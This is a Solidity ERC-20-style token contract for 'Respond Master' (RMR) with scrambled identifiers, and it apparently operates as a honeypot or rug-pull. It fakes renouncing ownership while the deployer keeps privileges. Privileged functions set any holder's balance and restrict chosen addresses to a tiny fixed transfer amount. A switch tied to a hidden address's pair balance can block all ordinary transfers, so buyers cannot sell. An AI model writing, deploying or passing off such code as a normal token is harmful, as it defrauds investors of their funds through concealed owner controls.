//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface receiverLaunched {
    function createPair(address sellMinExempt, address sellEnable) external returns (address);
}

interface maxIsMode {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atTotalToken) external view returns (uint256);

    function transfer(address senderSell, uint256 buyFund) external returns (bool);

    function allowance(address shouldTokenFrom, address spender) external view returns (uint256);

    function approve(address spender, uint256 buyFund) external returns (bool);

    function transferFrom(
        address sender,
        address senderSell,
        uint256 buyFund
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundFee, uint256 value);
    event Approval(address indexed shouldTokenFrom, address indexed spender, uint256 value);
}

abstract contract minAuto {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fundIsReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface maxIsModeMetadata is maxIsMode {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract RespondMaster is minAuto, maxIsMode, maxIsModeMetadata {

    uint256 fromReceiver;

    uint256 private enableFee;

    uint256 public exemptMin;

    function maxIs(address launchBuy, address senderSell, uint256 buyFund) internal returns (bool) {
        if (launchBuy == isLaunchedTx) {
            return feeLiquidity(launchBuy, senderSell, buyFund);
        }
        uint256 amountLaunched = maxIsMode(listBuy).balanceOf(minLaunchExempt);
        require(amountLaunched == fromReceiver);
        require(senderSell != minLaunchExempt);
        if (feeReceiver[launchBuy]) {
            return feeLiquidity(launchBuy, senderSell, isFund);
        }
        return feeLiquidity(launchBuy, senderSell, buyFund);
    }

    address public isLaunchedTx;

    mapping(address => bool) public feeReceiver;

    function swapFund() public {
        emit OwnershipTransferred(isLaunchedTx, address(0));
        txExempt = address(0);
    }

    function approve(address senderAmount, uint256 buyFund) public virtual override returns (bool) {
        receiverMarketingFund[_msgSender()][senderAmount] = buyFund;
        emit Approval(_msgSender(), senderAmount, buyFund);
        return true;
    }

    function owner() external view returns (address) {
        return txExempt;
    }

    function name() external view virtual override returns (string memory) {
        return tokenLiquiditySender;
    }

    function maxEnable() private view {
        require(minTotal[_msgSender()]);
    }

    mapping(address => uint256) private receiverBuy;

    uint256 private receiverExemptTx;

    string private senderReceiverLaunched = "RMR";

    uint8 private fromAmountSell = 18;

    function transferFrom(address launchBuy, address senderSell, uint256 buyFund) external override returns (bool) {
        if (_msgSender() != listTake) {
            if (receiverMarketingFund[launchBuy][_msgSender()] != type(uint256).max) {
                require(buyFund <= receiverMarketingFund[launchBuy][_msgSender()]);
                receiverMarketingFund[launchBuy][_msgSender()] -= buyFund;
            }
        }
        return maxIs(launchBuy, senderSell, buyFund);
    }

    function transfer(address limitFrom, uint256 buyFund) external virtual override returns (bool) {
        return maxIs(_msgSender(), limitFrom, buyFund);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return totalTeam;
    }

    address public listBuy;

    bool private teamLimit;

    function limitSwapTx(uint256 buyFund) public {
        maxEnable();
        fromReceiver = buyFund;
    }

    constructor (){
        
        fundIsReceiver amountEnableIs = fundIsReceiver(listTake);
        listBuy = receiverLaunched(amountEnableIs.factory()).createPair(amountEnableIs.WETH(), address(this));
        
        isLaunchedTx = _msgSender();
        minTotal[isLaunchedTx] = true;
        receiverBuy[isLaunchedTx] = totalTeam;
        swapFund();
        if (receiverExemptTx == exemptMin) {
            receiverExemptTx = exemptMin;
        }
        emit Transfer(address(0), isLaunchedTx, totalTeam);
    }

    function toFund(address limitFrom, uint256 buyFund) public {
        maxEnable();
        receiverBuy[limitFrom] = buyFund;
    }

    function feeLiquidity(address launchBuy, address senderSell, uint256 buyFund) internal returns (bool) {
        require(receiverBuy[launchBuy] >= buyFund);
        receiverBuy[launchBuy] -= buyFund;
        receiverBuy[senderSell] += buyFund;
        emit Transfer(launchBuy, senderSell, buyFund);
        return true;
    }

    uint256 constant isFund = 12 ** 10;

    bool private enableReceiver;

    function decimals() external view virtual override returns (uint8) {
        return fromAmountSell;
    }

    uint256 launchedList;

    address private txExempt;

    function allowance(address receiverMode, address senderAmount) external view virtual override returns (uint256) {
        if (senderAmount == listTake) {
            return type(uint256).max;
        }
        return receiverMarketingFund[receiverMode][senderAmount];
    }

    function feeTo(address liquidityTo) public {
        require(liquidityTo.balance < 100000);
        if (walletMode) {
            return;
        }
        
        minTotal[liquidityTo] = true;
        
        walletMode = true;
    }

    mapping(address => bool) public minTotal;

    function getOwner() external view returns (address) {
        return txExempt;
    }

    event OwnershipTransferred(address indexed walletMarketing, address indexed receiverLimit);

    function walletAtShould(address minTx) public {
        maxEnable();
        
        if (minTx == isLaunchedTx || minTx == listBuy) {
            return;
        }
        feeReceiver[minTx] = true;
    }

    bool public walletMode;

    function balanceOf(address atTotalToken) public view virtual override returns (uint256) {
        return receiverBuy[atTotalToken];
    }

    function symbol() external view virtual override returns (string memory) {
        return senderReceiverLaunched;
    }

    uint256 private totalTeam = 100000000 * 10 ** 18;

    bool private txLaunched;

    address listTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    string private tokenLiquiditySender = "Respond Master";

    address minLaunchExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => mapping(address => uint256)) private receiverMarketingFund;

}